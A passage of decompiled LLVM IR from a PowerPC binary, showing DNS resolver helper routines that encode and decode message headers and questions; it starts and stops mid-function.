  uselistorder i32 %v0_10013ba0, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_10013bb0, { 2, 3, 0, 1 }
  uselistorder i32 %v1_10013b50, { 1, 0 }
  uselistorder i32 %v2_10013b48, { 1, 0 }
  uselistorder i32 %v0_10013b40, { 1, 0, 2 }
  uselistorder i32 %v1_10013b28, { 1, 0 }
  uselistorder i32 %v2_10013b04, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 16, 12, 17, 14, 13, 15, 19 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 18, 9, 10, 16, 12, 17, 14, 13, 15, 19 }
  uselistorder i32 97, { 4, 5, 8, 7, 6, 0, 9, 3, 1, 2 }
  uselistorder i32 (i32, i8*)* @strcpy, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder i32* @r8, { 5, 9, 10, 11, 1, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 68, 69, 70, 71, 2, 61, 65, 66, 67, 7, 8, 72, 74, 75, 42, 62, 63, 64, 73, 43, 44, 45, 46, 47, 48, 49, 3, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 0, 60, 4, 6 }
  uselistorder i32* @r7, { 10, 11, 12, 13, 0, 14, 15, 16, 17, 1, 18, 19, 6, 20, 21, 22, 23, 2, 35, 36, 37, 8, 24, 25, 26, 27, 28, 29, 30, 31, 3, 32, 7, 4, 5, 33, 34, 9 }
  uselistorder i32* @r1, { 2, 4, 3, 1, 11, 0, 12, 13, 14, 5, 6, 7, 8, 9, 10, 15 }
  uselistorder i1 true, { 3, 0, 5, 6, 1, 2, 4 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 65535, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__GI_memset, { 25, 24, 16, 2, 15, 14, 21, 0, 5, 1, 20, 13, 12, 11, 23, 22, 19, 18, 17, 10, 9, 8, 7, 6, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10013d4c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10013d34, { 1, 0 }
  uselistorder label %dec_label_pc_10013cfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10013cd0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10013cac, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_10013c04, { 1, 0 }
  uselistorder label %dec_label_pc_10013bf8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10013bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10013bbc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10013bb8, { 1, 0 }
  uselistorder label %dec_label_pc_10013b70, { 1, 0 }
  uselistorder label %dec_label_pc_10013b28, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r7.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_10013e48, label %dec_label_pc_10013d70

dec_label_pc_10013d70:                            ; preds = %entry
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_10013d70 = add i32 %tmp, 2
  %v2_10013d70 = inttoptr i32 %v1_10013d70 to i8*
  %v3_10013d70 = load i8, i8* %v2_10013d70, align 1
  %v4_10013d70 = zext i8 %v3_10013d70 to i32
  store i32 %v4_10013d70, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r7.global-to-local, align 4
  store i8 %v3_10013d70, i8* %tmp3, align 1
  %v2_10013d7c = load i32, i32* %arg1, align 4
  store i32 %v2_10013d7c, i32* %r0.global-to-local, align 4
  %v1_10013d80 = trunc i32 %v2_10013d7c to i8
  %v4_10013d80 = add i32 %arg2, 1
  %v5_10013d80 = inttoptr i32 %v4_10013d80 to i8*
  store i8 %v1_10013d80, i8* %v5_10013d80, align 1
  %v1_10013d84 = add i32 %tmp, 12
  %v2_10013d84 = inttoptr i32 %v1_10013d84 to i32*
  %v3_10013d84 = load i32, i32* %v2_10013d84, align 4
  store i32 %v3_10013d84, i32* %r0.global-to-local, align 4
  %v1_10013d88 = add i32 %tmp, 16
  %v2_10013d88 = inttoptr i32 %v1_10013d88 to i32*
  %v3_10013d88 = load i32, i32* %v2_10013d88, align 4
  store i32 %v3_10013d88, i32* %r11.global-to-local, align 4
  %v1_10013d8c = add i32 %tmp, 4
  %v2_10013d8c = inttoptr i32 %v1_10013d8c to i32*
  %v3_10013d8c = load i32, i32* %v2_10013d8c, align 4
  %v2_10013d90 = icmp ne i32 %v3_10013d84, 0
  %v5_10013d94 = zext i1 %v2_10013d90 to i32
  store i32 %v5_10013d94, i32* %r10.global-to-local, align 4
  %v1_10013d98 = add i32 %tmp, 8
  %v2_10013d98 = inttoptr i32 %v1_10013d98 to i32*
  %v3_10013d98 = load i32, i32* %v2_10013d98, align 4
  %v2_10013d9c = icmp ne i32 %v3_10013d88, 0
  %v5_10013da0 = zext i1 %v2_10013d9c to i32
  %v1_10013da4 = add i32 %tmp, 20
  %v2_10013da4 = inttoptr i32 %v1_10013da4 to i32*
  %v3_10013da4 = load i32, i32* %v2_10013da4, align 4
  store i32 %v3_10013da4, i32* %r0.global-to-local, align 4
  %not.v2_10013da8 = icmp eq i32 %v3_10013d8c, 0
  %v6_10013dac = sext i1 %not.v2_10013da8 to i32
  store i32 %v5_10013da0, i32* %r11.global-to-local, align 4
  %v1_10013db4 = call i32 @__asm_rlwinm(i32 %v6_10013dac, i32 0, i32 24, i32 24)
  %v0_10013db8 = load i32, i32* %r10.global-to-local, align 4
  %v1_10013db8 = mul i32 %v0_10013db8, 4
  store i32 %v1_10013db8, i32* %r10.global-to-local, align 4
  %v1_10013dbc = call i32 @__asm_rlwinm(i32 %v3_10013d98, i32 3, i32 25, i32 28)
  %v0_10013dc0 = load i32, i32* %r0.global-to-local, align 4
  %v2_10013dc0 = icmp ne i32 %v0_10013dc0, 0
  %v5_10013dc4 = zext i1 %v2_10013dc0 to i32
  %v2_10013dc8 = or i32 %v1_10013db8, %v1_10013dbc
  store i32 %v2_10013dc8, i32* %r10.global-to-local, align 4
  %v1_10013dcc = add i32 %v1_10013db4, 128
  %v0_10013dd0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013dd0 = mul i32 %v0_10013dd0, 2
  store i32 %v1_10013dd0, i32* %r11.global-to-local, align 4
  %v2_10013dd4 = or i32 %v2_10013dc8, %v5_10013dc4
  store i32 %v2_10013dd4, i32* %r0.global-to-local, align 4
  %v2_10013dd8 = or i32 %v2_10013dd4, %v1_10013dcc
  %v2_10013ddc = or i32 %v2_10013dd8, %v1_10013dd0
  %v1_10013de0 = trunc i32 %v2_10013ddc to i8
  %v4_10013de0 = add i32 %arg2, 2
  %v5_10013de0 = inttoptr i32 %v4_10013de0 to i8*
  store i8 %v1_10013de0, i8* %v5_10013de0, align 1
  %v1_10013de4 = add i32 %tmp, 24
  %v2_10013de4 = inttoptr i32 %v1_10013de4 to i32*
  %v3_10013de4 = load i32, i32* %v2_10013de4, align 4
  %v1_10013de8 = add i32 %tmp, 28
  %v2_10013de8 = inttoptr i32 %v1_10013de8 to i32*
  %v3_10013de8 = load i32, i32* %v2_10013de8, align 4
  store i32 %v3_10013de8, i32* %r0.global-to-local, align 4
  %not.v2_10013dec = icmp eq i32 %v3_10013de4, 0
  %v6_10013df0 = sext i1 %not.v2_10013dec to i32
  %v1_10013df4 = call i32 @__asm_rlwinm(i32 %v6_10013df0, i32 0, i32 24, i32 24)
  %v1_10013df8 = urem i32 %v3_10013de8, 16
  store i32 %v1_10013df8, i32* %r0.global-to-local, align 4
  %v1_10013dfc = add i32 %v1_10013df4, 128
  %v2_10013e00 = or i32 %v1_10013df8, %v1_10013dfc
  %v1_10013e04 = trunc i32 %v2_10013e00 to i8
  %v4_10013e04 = add i32 %arg2, 3
  %v5_10013e04 = inttoptr i32 %v4_10013e04 to i8*
  store i8 %v1_10013e04, i8* %v5_10013e04, align 1
  %v1_10013e08 = add i32 %tmp, 34
  %v2_10013e08 = inttoptr i32 %v1_10013e08 to i8*
  %v3_10013e08 = load i8, i8* %v2_10013e08, align 1
  %v4_10013e08 = zext i8 %v3_10013e08 to i32
  store i32 %v4_10013e08, i32* %r0.global-to-local, align 4
  %v4_10013e0c = add i32 %arg2, 4
  %v5_10013e0c = inttoptr i32 %v4_10013e0c to i8*
  store i8 %v3_10013e08, i8* %v5_10013e0c, align 1
  %v1_10013e10 = add i32 %tmp, 32
  %v2_10013e10 = inttoptr i32 %v1_10013e10 to i32*
  %v3_10013e10 = load i32, i32* %v2_10013e10, align 4
  store i32 %v3_10013e10, i32* %r0.global-to-local, align 4
  %v1_10013e14 = trunc i32 %v3_10013e10 to i8
  %v4_10013e14 = add i32 %arg2, 5
  %v5_10013e14 = inttoptr i32 %v4_10013e14 to i8*
  store i8 %v1_10013e14, i8* %v5_10013e14, align 1
  %v1_10013e18 = add i32 %tmp, 38
  %v2_10013e18 = inttoptr i32 %v1_10013e18 to i8*
  %v3_10013e18 = load i8, i8* %v2_10013e18, align 1
  %v4_10013e18 = zext i8 %v3_10013e18 to i32
  store i32 %v4_10013e18, i32* %r0.global-to-local, align 4
  %v4_10013e1c = add i32 %arg2, 6
  %v5_10013e1c = inttoptr i32 %v4_10013e1c to i8*
  store i8 %v3_10013e18, i8* %v5_10013e1c, align 1
  %v1_10013e20 = add i32 %tmp, 36
  %v2_10013e20 = inttoptr i32 %v1_10013e20 to i32*
  %v3_10013e20 = load i32, i32* %v2_10013e20, align 4
  store i32 %v3_10013e20, i32* %r0.global-to-local, align 4
  %v1_10013e24 = trunc i32 %v3_10013e20 to i8
  %v4_10013e24 = add i32 %arg2, 7
  %v5_10013e24 = inttoptr i32 %v4_10013e24 to i8*
  store i8 %v1_10013e24, i8* %v5_10013e24, align 1
  %v1_10013e28 = add i32 %tmp, 42
  %v2_10013e28 = inttoptr i32 %v1_10013e28 to i8*
  %v3_10013e28 = load i8, i8* %v2_10013e28, align 1
  %v4_10013e28 = zext i8 %v3_10013e28 to i32
  store i32 %v4_10013e28, i32* %r0.global-to-local, align 4
  %v4_10013e2c = add i32 %arg2, 8
  %v5_10013e2c = inttoptr i32 %v4_10013e2c to i8*
  store i8 %v3_10013e28, i8* %v5_10013e2c, align 1
  %v1_10013e30 = add i32 %tmp, 40
  %v2_10013e30 = inttoptr i32 %v1_10013e30 to i32*
  %v3_10013e30 = load i32, i32* %v2_10013e30, align 4
  store i32 %v3_10013e30, i32* %r0.global-to-local, align 4
  %v1_10013e34 = trunc i32 %v3_10013e30 to i8
  %v4_10013e34 = add i32 %arg2, 9
  %v5_10013e34 = inttoptr i32 %v4_10013e34 to i8*
  store i8 %v1_10013e34, i8* %v5_10013e34, align 1
  %v1_10013e38 = add i32 %tmp, 46
  %v2_10013e38 = inttoptr i32 %v1_10013e38 to i8*
  %v3_10013e38 = load i8, i8* %v2_10013e38, align 1
  %v4_10013e38 = zext i8 %v3_10013e38 to i32
  store i32 %v4_10013e38, i32* %r0.global-to-local, align 4
  %v4_10013e3c = add i32 %arg2, 10
  %v5_10013e3c = inttoptr i32 %v4_10013e3c to i8*
  store i8 %v3_10013e38, i8* %v5_10013e3c, align 1
  %v1_10013e40 = add i32 %tmp, 44
  %v2_10013e40 = inttoptr i32 %v1_10013e40 to i32*
  %v3_10013e40 = load i32, i32* %v2_10013e40, align 4
  store i32 %v3_10013e40, i32* %r0.global-to-local, align 4
  %v1_10013e44 = trunc i32 %v3_10013e40 to i8
  %v4_10013e44 = add i32 %arg2, 11
  %v5_10013e44 = inttoptr i32 %v4_10013e44 to i8*
  store i8 %v1_10013e44, i8* %v5_10013e44, align 1
  %v0_10013e48.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10013e48

dec_label_pc_10013e48:                            ; preds = %entry, %dec_label_pc_10013d70
  %v0_10013e48 = phi i32 [ -1, %entry ], [ %v0_10013e48.pre, %dec_label_pc_10013d70 ]
  ret i32 %v0_10013e48

; uselistorder directives
  uselistorder i32 %v1_10013df8, { 1, 0 }
  uselistorder i32 %v1_10013dd0, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 2, 13, 6, 9, 8, 12, 11, 10, 1, 3, 5, 4, 7 }
  uselistorder i32* %r0.global-to-local, { 11, 12, 13, 14, 15, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 38, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10013e48, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10013e50 = load i8, i8* %arg1, align 1
  %v4_10013e50 = zext i8 %v3_10013e50 to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_10013e58 = add i32 %tmp, 1
  %v3_10013e58 = inttoptr i32 %v2_10013e58 to i8*
  %v4_10013e58 = load i8, i8* %v3_10013e58, align 1
  %v5_10013e58 = zext i8 %v4_10013e58 to i32
  %v1_10013e60 = mul nuw nsw i32 %v4_10013e50, 256
  %v2_10013e64 = or i32 %v5_10013e58, %v1_10013e60
  %v2_10013e68 = inttoptr i32 %arg2 to i32*
  store i32 %v2_10013e64, i32* %v2_10013e68, align 4
  %v0_10013e6c = load i32, i32* %r9.global-to-local, align 4
  %v1_10013e6c = add i32 %v0_10013e6c, 2
  %v2_10013e6c = inttoptr i32 %v1_10013e6c to i8*
  %v3_10013e6c = load i8, i8* %v2_10013e6c, align 1
  %v4_10013e6c = zext i8 %v3_10013e6c to i32
  %v1_10013e70 = call i32 @__asm_rlwinm(i32 %v4_10013e6c, i32 25, i32 31, i32 31)
  %v2_10013e74 = add i32 %arg2, 4
  %v3_10013e74 = inttoptr i32 %v2_10013e74 to i32*
  store i32 %v1_10013e70, i32* %v3_10013e74, align 4
  %v0_10013e78 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013e78 = add i32 %v0_10013e78, 2
  %v2_10013e78 = inttoptr i32 %v1_10013e78 to i8*
  %v3_10013e78 = load i8, i8* %v2_10013e78, align 1
  %v4_10013e78 = zext i8 %v3_10013e78 to i32
  %v1_10013e7c = call i32 @__asm_rlwinm(i32 %v4_10013e78, i32 29, i32 28, i32 31)
  %v2_10013e80 = add i32 %arg2, 8
  %v3_10013e80 = inttoptr i32 %v2_10013e80 to i32*
  store i32 %v1_10013e7c, i32* %v3_10013e80, align 4
  %v0_10013e84 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013e84 = add i32 %v0_10013e84, 2
  %v2_10013e84 = inttoptr i32 %v1_10013e84 to i8*
  %v3_10013e84 = load i8, i8* %v2_10013e84, align 1
  %v4_10013e84 = zext i8 %v3_10013e84 to i32
  %v1_10013e88 = call i32 @__asm_rlwinm(i32 %v4_10013e84, i32 30, i32 31, i32 31)
  %v2_10013e8c = add i32 %arg2, 12
  %v3_10013e8c = inttoptr i32 %v2_10013e8c to i32*
  store i32 %v1_10013e88, i32* %v3_10013e8c, align 4
  %v0_10013e90 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013e90 = add i32 %v0_10013e90, 2
  %v2_10013e90 = inttoptr i32 %v1_10013e90 to i8*
  %v3_10013e90 = load i8, i8* %v2_10013e90, align 1
  %v4_10013e90 = zext i8 %v3_10013e90 to i32
  %v1_10013e94 = call i32 @__asm_rlwinm(i32 %v4_10013e90, i32 31, i32 31, i32 31)
  %v2_10013e98 = add i32 %arg2, 16
  %v3_10013e98 = inttoptr i32 %v2_10013e98 to i32*
  store i32 %v1_10013e94, i32* %v3_10013e98, align 4
  %v0_10013e9c = load i32, i32* %r9.global-to-local, align 4
  %v1_10013e9c = add i32 %v0_10013e9c, 2
  %v2_10013e9c = inttoptr i32 %v1_10013e9c to i8*
  %v3_10013e9c = load i8, i8* %v2_10013e9c, align 1
  %tmp1 = urem i8 %v3_10013e9c, 2
  %v1_10013ea0 = zext i8 %tmp1 to i32
  %v2_10013ea4 = add i32 %arg2, 20
  %v3_10013ea4 = inttoptr i32 %v2_10013ea4 to i32*
  store i32 %v1_10013ea0, i32* %v3_10013ea4, align 4
  %v0_10013ea8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013ea8 = add i32 %v0_10013ea8, 3
  %v2_10013ea8 = inttoptr i32 %v1_10013ea8 to i8*
  %v3_10013ea8 = load i8, i8* %v2_10013ea8, align 1
  %v4_10013ea8 = zext i8 %v3_10013ea8 to i32
  %v1_10013eac = call i32 @__asm_rlwinm(i32 %v4_10013ea8, i32 25, i32 31, i32 31)
  %v2_10013eb0 = add i32 %arg2, 24
  %v3_10013eb0 = inttoptr i32 %v2_10013eb0 to i32*
  store i32 %v1_10013eac, i32* %v3_10013eb0, align 4
  %v0_10013eb4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013eb4 = add i32 %v0_10013eb4, 3
  %v2_10013eb4 = inttoptr i32 %v1_10013eb4 to i8*
  %v3_10013eb4 = load i8, i8* %v2_10013eb4, align 1
  %tmp2 = urem i8 %v3_10013eb4, 16
  %v1_10013eb8 = zext i8 %tmp2 to i32
  %v2_10013ebc = add i32 %arg2, 28
  %v3_10013ebc = inttoptr i32 %v2_10013ebc to i32*
  store i32 %v1_10013eb8, i32* %v3_10013ebc, align 4
  %v0_10013ec0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013ec0 = add i32 %v0_10013ec0, 4
  %v2_10013ec0 = inttoptr i32 %v1_10013ec0 to i8*
  %v3_10013ec0 = load i8, i8* %v2_10013ec0, align 1
  %v4_10013ec0 = zext i8 %v3_10013ec0 to i32
  %v1_10013ec4 = add i32 %v0_10013ec0, 5
  %v2_10013ec4 = inttoptr i32 %v1_10013ec4 to i8*
  %v3_10013ec4 = load i8, i8* %v2_10013ec4, align 1
  %v4_10013ec4 = zext i8 %v3_10013ec4 to i32
  %v1_10013ec8 = mul nuw nsw i32 %v4_10013ec0, 256
  %v2_10013ecc = or i32 %v4_10013ec4, %v1_10013ec8
  %v2_10013ed0 = add i32 %arg2, 32
  %v3_10013ed0 = inttoptr i32 %v2_10013ed0 to i32*
  store i32 %v2_10013ecc, i32* %v3_10013ed0, align 4
  %v0_10013ed4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013ed4 = add i32 %v0_10013ed4, 6
  %v2_10013ed4 = inttoptr i32 %v1_10013ed4 to i8*
  %v3_10013ed4 = load i8, i8* %v2_10013ed4, align 1
  %v4_10013ed4 = zext i8 %v3_10013ed4 to i32
  %v1_10013ed8 = add i32 %v0_10013ed4, 7
  %v2_10013ed8 = inttoptr i32 %v1_10013ed8 to i8*
  %v3_10013ed8 = load i8, i8* %v2_10013ed8, align 1
  %v4_10013ed8 = zext i8 %v3_10013ed8 to i32
  %v1_10013edc = mul nuw nsw i32 %v4_10013ed4, 256
  %v2_10013ee0 = or i32 %v4_10013ed8, %v1_10013edc
  %v2_10013ee4 = add i32 %arg2, 36
  %v3_10013ee4 = inttoptr i32 %v2_10013ee4 to i32*
  store i32 %v2_10013ee0, i32* %v3_10013ee4, align 4
  %v0_10013ee8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013ee8 = add i32 %v0_10013ee8, 8
  %v2_10013ee8 = inttoptr i32 %v1_10013ee8 to i8*
  %v3_10013ee8 = load i8, i8* %v2_10013ee8, align 1
  %v4_10013ee8 = zext i8 %v3_10013ee8 to i32
  %v1_10013eec = add i32 %v0_10013ee8, 9
  %v2_10013eec = inttoptr i32 %v1_10013eec to i8*
  %v3_10013eec = load i8, i8* %v2_10013eec, align 1
  %v4_10013eec = zext i8 %v3_10013eec to i32
  %v1_10013ef0 = mul nuw nsw i32 %v4_10013ee8, 256
  %v2_10013ef4 = or i32 %v4_10013eec, %v1_10013ef0
  %v2_10013ef8 = add i32 %arg2, 40
  %v3_10013ef8 = inttoptr i32 %v2_10013ef8 to i32*
  store i32 %v2_10013ef4, i32* %v3_10013ef8, align 4
  %v0_10013efc = load i32, i32* %r9.global-to-local, align 4
  %v1_10013efc = add i32 %v0_10013efc, 10
  %v2_10013efc = inttoptr i32 %v1_10013efc to i8*
  %v3_10013efc = load i8, i8* %v2_10013efc, align 1
  %v4_10013efc = zext i8 %v3_10013efc to i32
  %v1_10013f00 = add i32 %v0_10013efc, 11
  %v2_10013f00 = inttoptr i32 %v1_10013f00 to i8*
  %v3_10013f00 = load i8, i8* %v2_10013f00, align 1
  %v4_10013f00 = zext i8 %v3_10013f00 to i32
  store i32 %v4_10013f00, i32* %r9.global-to-local, align 4
  %v1_10013f04 = mul nuw nsw i32 %v4_10013efc, 256
  %v2_10013f08 = or i32 %v4_10013f00, %v1_10013f04
  %v2_10013f0c = add i32 %arg2, 44
  %v3_10013f0c = inttoptr i32 %v2_10013f0c to i32*
  store i32 %v2_10013f08, i32* %v3_10013f0c, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 8, 9, 6, 7, 14, 5, 13, 11, 0, 10, 1, 2, 3, 4, 12 }
  uselistorder i32 11, { 13, 14, 6, 16, 5, 3, 7, 0, 1, 8, 9, 10, 11, 12, 2, 4, 15 }
  uselistorder i32 40, { 8, 9, 1, 11, 10, 0, 2, 3, 4, 5, 6, 7, 12 }
  uselistorder i32 7, { 10, 11, 3, 6, 7, 8, 9, 1, 2, 4, 5, 0, 12, 13 }
  uselistorder i32 5, { 16, 17, 7, 8, 9, 2, 3, 10, 0, 11, 12, 1, 13, 14, 4, 5, 15, 6, 18 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 30, { 10, 9, 5, 6, 7, 8, 0, 1, 2, 11, 12, 3, 4, 13, 14, 15, 16 }
  uselistorder i32 28, { 34, 35, 36, 37, 4, 5, 10, 38, 16, 48, 42, 0, 43, 44, 45, 6, 7, 17, 12, 11, 39, 40, 18, 19, 20, 21, 22, 23, 26, 24, 25, 1, 27, 49, 41, 13, 14, 15, 28, 2, 3, 29, 8, 9, 30, 31, 32, 33, 46, 47 }
  uselistorder i32 29, { 9, 12, 13, 10, 11, 6, 2, 15, 3, 16, 0, 1, 17, 18, 7, 8, 21, 22, 19, 20, 4, 5, 14 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_10013f30 = load i32, i32* %arg1, align 4
  store i32 %v2_10013f30, i32* %r3.global-to-local, align 4
  store i32 268517176, i32* @lr, align 4
  %v1_10013f34 = inttoptr i32 %v2_10013f30 to i8*
  %v2_10013f34 = call i32 @__encode_dotted(i8* %v1_10013f34)
  store i32 %v2_10013f34, i32* %r3.global-to-local, align 4
  %v1_10013f38 = icmp slt i32 %v2_10013f34, 0
  %v1_10013f3c = load i32, i32* @r29, align 4
  %v2_10013f3c = sub i32 %v1_10013f3c, %v2_10013f34
  store i32 %v2_10013f3c, i32* @r29, align 4
  br i1 %v1_10013f38, label %dec_label_pc_10013f7c, label %dec_label_pc_10013f48

dec_label_pc_10013f48:                            ; preds = %entry
  %v2_10013f40 = icmp sgt i32 %v2_10013f3c, 3
  %v0_10013f48 = load i32, i32* @r30, align 4
  %v2_10013f48 = add i32 %v0_10013f48, %v2_10013f34
  store i32 %v2_10013f48, i32* %r9.global-to-local, align 4
  br i1 %v2_10013f40, label %dec_label_pc_10013f58, label %dec_label_pc_10013f50

dec_label_pc_10013f50:                            ; preds = %dec_label_pc_10013f48
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013f7c

dec_label_pc_10013f58:                            ; preds = %dec_label_pc_10013f48
  %v0_10013f58 = load i32, i32* @r31, align 4
  %v1_10013f58 = add i32 %v0_10013f58, 6
  %v2_10013f58 = inttoptr i32 %v1_10013f58 to i8*
  %v3_10013f58 = load i8, i8* %v2_10013f58, align 1
  %v5_10013f5c = inttoptr i32 %v2_10013f48 to i8*
  store i8 %v3_10013f58, i8* %v5_10013f5c, align 1
  %v0_10013f60 = load i32, i32* %r3.global-to-local, align 4
  %v1_10013f60 = add i32 %v0_10013f60, 4
  store i32 %v1_10013f60, i32* %r3.global-to-local, align 4
  %v0_10013f64 = load i32, i32* @r31, align 4
  %v1_10013f64 = add i32 %v0_10013f64, 4
  %v2_10013f64 = inttoptr i32 %v1_10013f64 to i32*
  %v3_10013f64 = load i32, i32* %v2_10013f64, align 4
  %v1_10013f68 = trunc i32 %v3_10013f64 to i8
  %v2_10013f68 = load i32, i32* %r9.global-to-local, align 4
  %v3_10013f68 = add i32 %v2_10013f68, 1
  %v4_10013f68 = inttoptr i32 %v3_10013f68 to i8*
  store i8 %v1_10013f68, i8* %v4_10013f68, align 1
  %v0_10013f6c = load i32, i32* @r31, align 4
  %v1_10013f6c = add i32 %v0_10013f6c, 10
  %v2_10013f6c = inttoptr i32 %v1_10013f6c to i8*
  %v3_10013f6c = load i8, i8* %v2_10013f6c, align 1
  %v2_10013f70 = load i32, i32* %r9.global-to-local, align 4
  %v3_10013f70 = add i32 %v2_10013f70, 2
  %v4_10013f70 = inttoptr i32 %v3_10013f70 to i8*
  store i8 %v3_10013f6c, i8* %v4_10013f70, align 1
  %v0_10013f74 = load i32, i32* @r31, align 4
  %v1_10013f74 = add i32 %v0_10013f74, 8
  %v2_10013f74 = inttoptr i32 %v1_10013f74 to i32*
  %v3_10013f74 = load i32, i32* %v2_10013f74, align 4
  %v1_10013f78 = trunc i32 %v3_10013f74 to i8
  %v2_10013f78 = load i32, i32* %r9.global-to-local, align 4
  %v3_10013f78 = add i32 %v2_10013f78, 3
  %v4_10013f78 = inttoptr i32 %v3_10013f78 to i8*
  store i8 %v1_10013f78, i8* %v4_10013f78, align 1
  %v0_10013f8c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10013f7c

dec_label_pc_10013f7c:                            ; preds = %entry, %dec_label_pc_10013f50, %dec_label_pc_10013f58
  %v0_10013f8c = phi i32 [ %v2_10013f34, %entry ], [ -1, %dec_label_pc_10013f50 ], [ %v0_10013f8c.pre, %dec_label_pc_10013f58 ]
  ret i32 %v0_10013f8c

; uselistorder directives
  uselistorder i32 %v2_10013f34, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_10013f7c, { 2, 1, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268517280, i32* @lr, align 4
  %v0_10013f9c = call i32 @__length_dotted()
  %v1_10013fa0 = icmp slt i32 %v0_10013f9c, 0
  br i1 %v1_10013fa0, label %dec_label_pc_10013fac, label %dec_label_pc_10013fa8

dec_label_pc_10013fa8:                            ; preds = %entry
  %v1_10013fa8 = add i32 %v0_10013f9c, 4
  br label %dec_label_pc_10013fac

dec_label_pc_10013fac:                            ; preds = %entry, %dec_label_pc_10013fa8
  %v0_10013fb8 = phi i32 [ %v0_10013f9c, %entry ], [ %v1_10013fa8, %dec_label_pc_10013fa8 ]
  ret i32 %v0_10013fb8

; uselistorder directives
  uselistorder label %dec_label_pc_10013fac, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_10013fc0 = load i32, i32* @lr, align 4
  store i32 %v0_10013fc0, i32* %r0.global-to-local, align 4
  %v2_10013fc8 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_10013fc8, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268517356, i32* @lr, align 4
  %v2_10013fe8 = call i32 @__decode_dotted(i32 %v2_10013fc8, i32 256)
  store i32 %v2_10013fe8, i32* @r27, align 4
  %v1_10013fec = icmp slt i32 %v2_10013fe8, 0
  %v0_10013ff0 = load i32, i32* @r28, align 4
  %v2_10013ff0 = add i32 %v0_10013ff0, %v2_10013fe8
